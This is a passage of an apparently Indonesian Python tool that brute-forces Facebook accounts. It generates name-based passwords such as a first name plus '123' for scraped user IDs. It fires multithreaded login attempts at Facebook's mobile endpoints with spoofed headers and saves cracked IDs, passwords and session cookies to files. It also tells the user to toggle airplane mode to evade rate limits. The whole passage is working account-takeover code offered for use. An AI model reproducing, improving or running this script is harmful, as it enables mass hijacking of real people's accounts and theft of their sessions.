            except ( requests.exceptions.ConnectionError ):time.sleep(31)
        self.loop+=1
        
    #-----[ METHOD-MOBILE ]-----#
    def Mobile(self,userid,password):
        prog.update(des,description=f' {J}# {A}MOBILE {J}*_> {H}OK {A}-: {H}{self.live} {K}CP {A}-: {K}{self.ceck} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
        prog.advance(des) 
        for userpas in password:
            try:
                response = self.ses.get('https://free.prod.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&fl&login_from_aymh=1&refid=9').text
                encoding = {
                    "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
                    "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
                    "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
                    "try_number": 0, 
                    "unrecognized_tries": 0, 
                    "email":userid,
                    "encpass": "#PWD_BROWSER:0:{}:{}".format(str(timeripz()).split('.')[0], userpas),
                    "login":"Log + In", 
                    "bi_xrwh": 0}
                headers = Miya().head_mobile()
                cookies = ';'.join(['%s=%s'%(name, value) for name, value in self.ses.cookies.get_dict().items()])
                params = {'next':'https://free.prod.facebook.com/pages/?category=top&ref=bookmarks&wtsid=rdr_0WLXe9WWdaCQsCD7x','ref':'bookmarks','fl':'','login_from_aymh':'1','refid':'9'}
                response = par(self.ses.post('https://free.prod.facebook.com/login/',data=encoding,params=params,cookies={'cookie':cookies},headers=headers,allow_redirects=False).text,"html.parser")
                payload = self.ses.cookies.get_dict()
                if 'c_user' in payload.keys():
                    coki = ';'.join(['%s=%s'%(name,value) for name,value in self.ses.cookies.get_dict().items()])
                    print(f' {J}*__> {H}{userid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                    resok=('%s<=>%s<=>%s'%(userid,userpas,coki)) 
                    with open('OK/'+self.okc,'a') as wr:
                        wr.write(resok)
                        wr.close()   
                    self.live+=1                           
                    break                        
                elif 'checkpoint' in payload.keys():
                    print(f' {J}*__> {K}{userid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                    rescp=('%s<=>%s<=>%s'%(userid,userpas))         
                    with open('CP/'+self.cpc,'a') as wr:
                        wr.write(rescp)
                        wr.close()    
                    self.ceck+=1                         
                    break
                else:continue
            except ( requests.exceptions.ConnectionError ):time.sleep(31)
        self.loop+=1
        
# CRACK       
class CrackM:   
    # fuction init
    def __init__(self):
        self.ses = requests.Session()
        self.live, self.ceck, self.loop = 0,0,0
        
    #----------[ WORDLIST ]----------# 
    def Generate_listM(self):
        global prog,des
        print('\n')
        self.okc,self.cpc = self.hasil_email()
        Cons().print(f' {A}[{J}*{A}] Hasil OK Simpan/{H}{self.okc}')
        Cons().print(f' {A}[{J}*{A}] Hasil CP Simpan/{K}{self.cpc}')
        Cons().print(f'\n {J}# {A}Mainkan Mode Pesawat Setiap 300 ID\n')
        prog = Progress(TextColumn("{task.description}"), TextColumn("{task.percentage:.0f}%"))
        des = prog.add_task('',total=len(dumpid))
        with prog:
            with ThreadPoolExecutor(max_workers=30) as V:
                for akun in dumpid:
                    userid, username = akun.split('<=>')[0], akun.split('<=>')[1].lower()
                    password = self.Generate_pasM(username)
                    V.submit(self.LoginFb,userid,password) 
                    
     #----------[ PASSWORD ]----------#             
    def Generate_pasM(self,username):
        for nama in username.split(' '):
            nama.lower()
            if len(nama) == 3 or len(nama) == 4 or len(nama) == 5: password = [nama, nama+"123", nama+"1234", nama+"12345", nama+"123456"]
            else: password = [nama, nama+"123", nama+"1234", nama+"12345", nama+"123456"]
        return ( password )
                    
       #----------[ CHECK-RESULT ]----------# 
        if self.live == 0 or self.ceck ==0:
            Cons().print(f'\n {A}[{M}*{A}] Opss, anda tidak mendapatkan hasil')
        else:
            Cons().print(f'\n {A}[{J}*{A}] Selamat, anda mendapatkan hasil OK : {H}{self.live}{A} dan hasil CP : {K}{self.ceck}{A}')
                    
    #----------[ RESULT ]----------# 
    def hasil_email(self):
        now = datetime.now()
        day = now.day
        year = now.year
        month = now.month
        try:
            if month < 0 or month > 12:exit()
            else: month - 0
            self.okc = f'OK-{day}-{month}-{year}.txt'
            self.cpc = f'CP-{day}-{month}-{year}.txt'  
        except ValueError:sya.exit(e)
        return self.okc, self.cpc
        
    #-----[ METHOD-REGULER ]-----#
    def LoginFb(self,userid,password):
        prog.update(des,description=f' {J}# {A}REGULER {J}*_> {H}OK {A}-: {H}{self.live} {K}CP {A}-: {K}{self.ceck} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
        prog.advance(des)
        for userpas in password:
            try:
                self.ses.headers.update=({
                    "Host":"free.prod.facebook.com",
                    "Upgrade-Insecure-Requests":"1",
                    "User-Agent": Miya().Useragent(),
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Dnt":str(random.randint(1,9)),
                    "X-requested-With":"mark.via.gp",
                    "Sec-Fetch-Site":"none",
                    "Sec-Fetch-Mode":"navigate",
                    "Sec-Fetch-User":"?1",
                    "sec-fetch-dest":"document",
                    "Referer":"https://free.prod.facebook.com/",
                    "Accept-Encoding":"gzip, deflate br",
                    "Accept-Language":"id-ID;q=0.6,en;q=0.7,en-US;q=0.8,en;q=0.9"
                    })
                response = self.ses.get('https://free.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
                encoding = {"lsd":re.search('name="lsd" value="(.*?)"',str(response)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(response)).group(1),"email":userid,"pass":userpas}
                headers = Miya().head_email()
                response = self.ses.post('https://free.prod.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',headers=headers, data=encoding,allow_redirects=False)              
                payload = self.ses.cookies.get_dict()
                if 'c_user' in payload.keys():
                    coki = ';'.join(['%s=%s'%(name,value) for name,value in self.ses.cookies.get_dict().items()])
                    print(f' {J}*__> {H}{userid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                    resok=('%s<=>%s<=>%s'%(userid,userpas,coki)) 
                    with open('OK/'+self.okc,'a') as wr:
                        wr.write(resok)
                        wr.close()  
                    self.live+=1                        
                    break                        
                elif 'checkpoint' in payload.keys():
                    print(f' {J}*__> {K}{userid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                    rescp=('%s<=>%s<=>%s'%(userid,userpas))         
                    with open('CP/'+self.cpc,'a') as wr:
                        wr.write(rescp)
                        wr.close()    
                    self.ceck+=1                         
                    break
                else:continue
            except ( requests.exceptions.ConnectionError ):time.sleep(31)
        self.loop+=1

#-----[ SETTING ]-----#   
if __name__ == '__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('data/login')
    except:pass
    try: FanzMiya()
    except ( Exception ) as e:sys.exit(e)
                    